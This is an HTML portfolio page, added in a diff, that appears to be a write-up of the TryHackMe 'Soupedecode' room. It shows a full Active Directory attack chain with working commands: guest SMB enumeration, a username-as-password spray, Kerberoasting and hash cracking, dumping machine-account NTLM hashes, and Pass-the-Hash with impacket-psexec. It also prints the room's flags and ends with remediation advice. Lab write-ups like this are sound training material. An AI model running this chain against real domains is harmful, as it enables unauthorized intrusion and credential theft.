@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="The Soupedecode engagement targeted the SOUPEDECODE.LOCAL domain controller. Guest SMB access allowed RID enumeration and a password spray that recovered creden">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Soupedecode — Penetration Test Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Soupedecode — Penetration Test Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Soupedecode — Penetration Test Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-easy">Easy</span> <span class="dot">·</span> <span class="date">2026-06-05</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> SOUPEDECODE.LOCAL (10.66.164.129) <strong>Date:</strong> 2026-06-05 <strong>Objective:</strong> Compromise the domain controller via Kerberos, SMB, and Pass-the-Hash</p>
+<hr>
+<p>The Soupedecode engagement targeted the SOUPEDECODE.LOCAL domain controller. Guest SMB access allowed RID enumeration and a password spray that recovered credentials for ybob317, granting access to the Users share and the user flag. Kerberoasting the file_svc service account unlocked a backup share containing NTLM hashes for all machine accounts. A Pass-the-Hash attack using the FileServer$ account, a member of the Domain Admins group, provided administrative access and the root flag.</p>
+<hr>
+<h2>1. Reconnaissance</h2>
+<h3>Port Scan</h3>
+<pre><code>88/tcp   Kerberos
+135/tcp  RPC
+389/tcp  LDAP
+445/tcp  SMB
+464/tcp  kpasswd5
+593/tcp  HTTP RPC EP Map
+636/tcp  LDAPS (reset)
+3268/tcp Global Catalog LDAP
+3269/tcp Global Catalog LDAPS
+3389/tcp RDP
+5985/tcp WinRM (filtered)
+9389/tcp AD Web Services</code></pre>
+<p><strong>Domain:</strong> SOUPEDECODE.LOCAL | <strong>NetBIOS:</strong> SOUPEDECODE | <strong>DC:</strong> DC01 (Windows Server 2022)</p>
+<h3>SMB Enumeration</h3>
+<p>Guest account (empty password) allowed null-session access to IPC$:</p>
+<pre><code>smbclient -N -L //10.66.164.129</code></pre>
+<p>Shares identified: ADMIN$, backup, C$, IPC$, NETLOGON, SYSVOL, Users. Guest had no read access to file shares.</p>
+<hr>
+<h2>2. Initial Access — Password Spray</h2>
+<h3>2.1 User Enumeration</h3>
+<p>Used <code>impacket-lookupsid</code> via guest SMB session to enumerate 200+ domain users:</p>
+<pre><code>impacket-lookupsid -no-pass SOUPEDECODE.LOCAL/guest@10.66.164.129</code></pre>
+<p>Users followed a pattern: <code>first_initial + lastname + number</code> (e.g., <code>bmark0</code>), plus service accounts (<code>admin</code>, <code>charlie</code>, <code>backup_svc</code>, <code>file_svc</code>, <code>web_svc</code>, <code>monitoring_svc</code>, <code>firewall_svc</code>).</p>
+<h3>2.2 Password Spray</h3>
+<p>A password spray using the <strong>username as the password</strong> yielded valid credentials:</p>
+<pre><code>User: ybob317
+Password: ybob317</code></pre>
+<p><strong>Evidence:</strong></p>
+<pre><code>nxc smb 10.66.164.129 -u ybob317 -p ybob317 --shares
+SMB [+] SOUPEDECODE.LOCAL\ybob317:ybob317</code></pre>
+<h3>2.3 User Flag</h3>
+<p>Accessed the <code>Users</code> SMB share to retrieve the user flag:</p>
+<pre><code>smbclient //10.66.164.129/Users -U &#x27;SOUPEDECODE\ybob317%ybob317&#x27; \
+  -c &#x27;cd ybob317\Desktop; get user.txt /tmp/soupedecode/user.txt&#x27;</code></pre>
+<p><strong>User Flag:</strong> <code>28189316c25dd3c0ad56d44d000d62a8</code></p>
+<hr>
+<h2>3. Kerberoasting</h2>
+<p>Used <code>ybob317</code>'s credentials to enumerate service accounts with SPNs:</p>
+<pre><code>impacket-GetUserSPNs -dc-ip 10.66.164.129 \
+  &#x27;SOUPEDECODE.LOCAL/ybob317:ybob317&#x27; -request</code></pre>
+<p>Five Kerberoastable accounts discovered:</p>
+<table>
+<thead><tr>
+<th>SPN</th>
+<th>Account</th>
+</tr></thead><tbody>
+<tr>
+<td><code>FTP/FileServer</code></td>
+<td><code>file_svc</code></td>
+</tr>
+<tr>
+<td><code>FW/ProxyServer</code></td>
+<td><code>firewall_svc</code></td>
+</tr>
+<tr>
+<td><code>HTTP/BackupServer</code></td>
+<td><code>backup_svc</code></td>
+</tr>
+<tr>
+<td><code>HTTP/WebServer</code></td>
+<td><code>web_svc</code></td>
+</tr>
+<tr>
+<td><code>HTTPS/MonitoringServer</code></td>
+<td><code>monitoring_svc</code></td>
+</tr>
+</tbody></table>
+<p>The <code>file_svc</code> TGS hash was cracked using rockyou.txt:</p>
+<pre><code>Hashcat mode 13100
+Password: Password123!!</code></pre>
+<p><strong>Verification:</strong></p>
+<pre><code>nxc smb 10.66.164.129 -u file_svc -p &#x27;Password123!!&#x27;
+SMB [+] SOUPEDECODE.LOCAL\file_svc:Password123!!</code></pre>
+<hr>
+<h2>4. Backup Share — Machine Account Hashes</h2>
+<h3>4.1 Accessing the Backup Share</h3>
+<p><code>file_svc</code> had read access to the custom <code>backup</code> share:</p>
+<pre><code>smbclient //10.66.164.129/backup -U &#x27;SOUPEDECODE\file_svc%Password123!!&#x27;</code></pre>
+<h3>4.2 Machine Account NTLM Hashes</h3>
+<p>The file <code>backup_extract.txt</code> contained NTLM hashes for 10 machine accounts:</p>
+<pre><code>FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::</code></pre>
+<p>Key finding: <code>FileServer$</code> belonged to a privileged group (Domain Admins / Enterprise Admins).</p>
+<hr>
+<h2>5. Domain Admin — Pass-the-Hash</h2>
+<h3>5.1 PtH with FileServer$</h3>
+<p>Used <code>FileServer$</code>'s NTLM hash for Pass-the-Hash authentication:</p>
+<pre><code>impacket-psexec -hashes &#x27;:e41da7e79a4c76dbd9cf79d1cb325559&#x27; \
+  &#x27;SOUPEDECODE.LOCAL/FileServer$@10.66.164.129&#x27; \
+  &#x27;cmd.exe /c type C:\Users\Administrator\Desktop\root.txt&#x27;</code></pre>
+<h3>5.2 Root Flag</h3>
+<p><strong>Root Flag:</strong> <code>27cb2be302c388d63d27c86bfdd5f56a</code></p>
+<hr>
+<h2>6. Attack Chain Summary</h2>
+<table>
+<thead><tr>
+<th>Step</th>
+<th>Technique</th>
+<th>Credential</th>
+</tr></thead><tbody>
+<tr>
+<td>1</td>
+<td>Guest SMB → RID enumeration</td>
+<td>guest:""</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Password spray (username as password)</td>
+<td>ybob317:ybob317</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Kerberoasting → crack TGS hash</td>
+<td>file_svc:Password123!!</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Backup share → machine hash extraction</td>
+<td>FileServer$:e41da...</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Pass-the-Hash → SYSTEM shell</td>
+<td>FileServer$ NTLM</td>
+</tr>
+</tbody></table>
+<h3>Flags</h3>
+<table>
+<thead><tr>
+<th>Flag</th>
+<th>Value</th>
+</tr></thead><tbody>
+<tr>
+<td>User</td>
+<td><code>28189316c25dd3c0ad56d44d000d62a8</code></td>
+</tr>
+<tr>
+<td>Root</td>
+<td><code>27cb2be302c388d63d27c86bfdd5f56a</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2>7. Remediation Recommendations</h2>
+<ul>
+<li><strong>Disable Guest SMB access:</strong> Guest account should not have SMB null-session access for user enumeration.</li>
+<li><strong>Enforce password complexity:</strong> <code>ybob317:ybob317</code> is a trivial credential. Implement password policies requiring complexity and preventing username-based passwords.</li>
+<li><strong>Rotate machine account passwords:</strong> The <code>backup_extract.txt</code> containing NTLM hashes should not be accessible to a low-privilege service account.</li>
+<li><strong>Restrict backup share permissions:</strong> The <code>backup</code> share should have stricter ACLs limiting access to only authorized administrators.</li>
+<li><strong>Monitor for Kerberoasting:</strong> Excessive TGS-REQ requests for service accounts should trigger alerts.</li>
+<li><strong>Implement SMB signing enforcement:</strong> Prevents relay and replay attacks on the SMB protocol.</li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
